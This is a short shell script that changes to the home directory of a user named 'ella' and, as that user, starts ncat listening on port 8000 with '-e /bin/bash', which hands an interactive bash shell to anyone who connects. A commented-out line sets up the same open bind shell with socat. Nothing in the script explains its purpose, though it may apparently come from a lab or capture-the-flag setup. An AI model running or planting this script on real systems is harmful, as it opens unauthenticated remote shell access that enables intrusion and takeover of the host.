#!/bin/sh

cd /home/ella
su ella -l --session-command "ncat -lnvkp 8000 -e /bin/bash"

# su ella -l --session-command "socat tcp-listen:8000,fork,reuseaddr exec:'/bin/bash -li',stderr,sane"
